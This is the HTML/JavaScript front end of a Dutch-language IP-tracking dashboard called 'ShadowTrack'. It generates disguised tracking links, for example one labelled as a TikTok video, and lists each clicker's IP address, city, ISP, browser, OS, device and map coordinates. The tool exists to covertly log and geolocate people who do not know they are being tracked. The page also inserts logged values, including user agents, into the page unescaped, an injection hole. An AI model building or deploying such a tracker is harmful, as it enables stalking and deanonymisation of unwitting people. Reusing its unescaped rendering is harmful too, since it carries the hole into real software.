<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ShadowTrack - Dashboard</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
    
    * { box-sizing: border-box; }
    
    body {
      margin: 0;
      padding: 20px;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #0a0a0a, #1a0033);
      color: #eee;
      min-height: 100vh;
    }
    
    h1 { color: #00ff88; text-align: center; font-size: 2.8rem; margin-bottom: 10px; }
    h2 { color: #00ccff; }
    
    .container { max-width: 1200px; margin: 0 auto; }
    
    input, button {
      padding: 12px;
      margin: 8px 4px;
      border-radius: 8px;
      border: none;
      font-family: 'Inter', sans-serif;
    }
    
    button {
      background: #00ff88;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: 0.2s;
    }
    
    button:hover { background: #00dd77; transform: translateY(-2px); }
    button.secondary { background: #00ccff; }
    button.secondary:hover { background: #00bbee; }
    
    .link { background: #222; padding: 15px; border-radius: 8px; word-break: break-all; margin: 10px 0; }
    
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      background: rgba(0,0,0,0.4);
    }
    
    th, td {
      padding: 12px;
      border: 1px solid #333;
      text-align: left;
    }
    
    th { background: #00aa66; }
    td button { padding: 8px 12px; font-size: 0.9rem; }
    
    /* Modal */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      z-index: 1000;
      align-items: center;
      justify-content: center;
    }
    
    .modal.active { display: flex; }
    
    .modal-content {
      background: #1a1a2e;
      border-radius: 12px;
      padding: 30px;
      width: 90%;
      max-width: 900px;
      max-height: 90vh;
      overflow-y: auto;
      color: #eee;
    }
    
    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }
    
    .modal-header h2 { margin: 0; color: #00ff88; }
    .close-btn { background: #ff4444; color: white; border: none; padding: 8px 12px; cursor: pointer; border-radius: 4px; }
    
    .detail-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      margin-bottom: 20px;
    }
    
    .detail-item {
      background: rgba(0, 255, 136, 0.1);
      padding: 15px;
      border-radius: 8px;
      border-left: 3px solid #00ff88;
    }
    
    .detail-item strong { color: #00ff88; }
    
    #map {
      width: 100%;
      height: 400px;
      border-radius: 8px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>SHADOWTRACK</h1>
    <p style="text-align:center; opacity:0.8;">Dashboard - Geavanceerde IP Tracking</p>

    <h2>Nieuwe Tracking Link Aanmaken</h2>
    <input type="text" id="name" placeholder="Naam (bijv. TikTok video)" style="width:300px;">
    <input type="text" id="destination" placeholder="Doel URL (https://...)" style="width:500px;">
    <button onclick="generateLink()">Link Aanmaken</button>

    <div id="result"></div>

    <hr>
    <h2>Laatste Logs</h2>
    <table id="logsTable">
      <thead>
        <tr>
          <th>Tijd</th>
          <th>Tracker</th>
          <th>IP</th>
          <th>Land</th>
          <th>Stad</th>
          <th>Browser / OS</th>
          <th>Actie</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>
  </div>

  <!-- Detail Modal -->
  <div id="detailModal" class="modal">
    <div class="modal-content">
      <div class="modal-header">
        <h2>Log Details</h2>
        <button class="close-btn" onclick="closeModal()">×</button>
      </div>
      <div id="detailContent"></div>
    </div>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
  <script>
    let allLogs = [];
    let currentMap = null;

    async function generateLink() {
      const name = document.getElementById('name').value.trim();
      const destination = document.getElementById('destination').value.trim();

      if (!name || !destination) {
        alert("Vul naam én doel URL in!");
        return;
      }

      const trackerId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 10);
      const fullLink = `${window.location.origin}/track/${trackerId}`;

      try {
        await fetch('/api/save-tracker', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({tracker_id: trackerId, name, destination_url: destination})
        });

        document.getElementById('result').innerHTML = `
          <p><strong>✅ Link aangemaakt!</strong></p>
          <div class="link">${fullLink}</div>
          <button onclick="copyLink('${fullLink}')">Kopiëren</button>
        `;
        
        document.getElementById('name').value = '';
        document.getElementById('destination').value = '';
      } catch(e) {
        alert("Fout bij opslaan");
      }
    }

    function copyLink(link) {
      navigator.clipboard.writeText(link);
      alert("Gekopieerd!");
    }

    function showDetails(logIndex) {
      const log = allLogs[logIndex];
      const hasCoords = log.latitude && log.longitude;

      let html = `
        <div class="detail-grid">
          <div class="detail-item">
            <strong>Tijdstempel:</strong><br>
            ${new Date(log.timestamp).toLocaleString('nl-NL')}
          </div>
          <div class="detail-item">
            <strong>Tracker ID:</strong><br>
            ${log.tracker_id}
          </div>
          <div class="detail-item">
            <strong>IP Adres:</strong><br>
            ${log.ip}
          </div>
          <div class="detail-item">
            <strong>Land:</strong><br>
            ${log.country}
          </div>
          <div class="detail-item">
            <strong>Stad:</strong><br>
            ${log.city}
          </div>
          <div class="detail-item">
            <strong>ISP:</strong><br>
            ${log.isp}
          </div>
          <div class="detail-item">
            <strong>Browser:</strong><br>
            ${log.browser}
          </div>
          <div class="detail-item">
            <strong>Besturingssysteem:</strong><br>
            ${log.os}
          </div>
          <div class="detail-item">
            <strong>Apparaat:</strong><br>
            ${log.device}
          </div>
          <div class="detail-item">
            <strong>User Agent:</strong><br>
            <small>${log.useragent}</small>
          </div>
        </div>
      `;

      if (hasCoords) {
        html += `
          <div class="detail-item">
            <strong>🗺️ Coördinaten:</strong><br>
            Latitude: ${log.latitude.toFixed(4)}<br>
            Longitude: ${log.longitude.toFixed(4)}
          </div>
          <div id="map"></div>
        `;
      }

      document.getElementById('detailContent').innerHTML = html;
      document.getElementById('detailModal').classList.add('active');

      // Initialize map if coordinates exist
      if (hasCoords) {
        setTimeout(() => {
          if (currentMap) currentMap.remove();
          currentMap = L.map('map').setView([log.latitude, log.longitude], 10);
          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(currentMap);
          L.marker([log.latitude, log.longitude]).addTo(currentMap).bindPopup(`${log.city}, ${log.country}`);
        }, 100);
      }
    }

    function closeModal() {
      document.getElementById('detailModal').classList.remove('active');
      if (currentMap) currentMap.remove();
    }

    // Load logs
    fetch('/api/logs')
      .then(r => r.json())
      .then(logs => {
        allLogs = logs;
        const tbody = document.querySelector('#logsTable tbody');
        tbody.innerHTML = '';
        logs.forEach((log, idx) => {
          const row = `<tr>
            <td>${new Date(log.timestamp).toLocaleString('nl-NL')}</td>
            <td>${log.tracker_id}</td>
            <td>${log.ip}</td>
            <td>${log.country}</td>
            <td>${log.city}</td>
            <td>${log.browser} / ${log.os}</td>
            <td><button class="secondary" onclick="showDetails(${idx})">📍 Details</button></td>
          </tr>`;
          tbody.innerHTML += row;
        });
      });

    // Close modal on outside click
    document.getElementById('detailModal').addEventListener('click', (e) => {
      if (e.target.id === 'detailModal') closeModal();
    });
  </script>
</body>
</html>
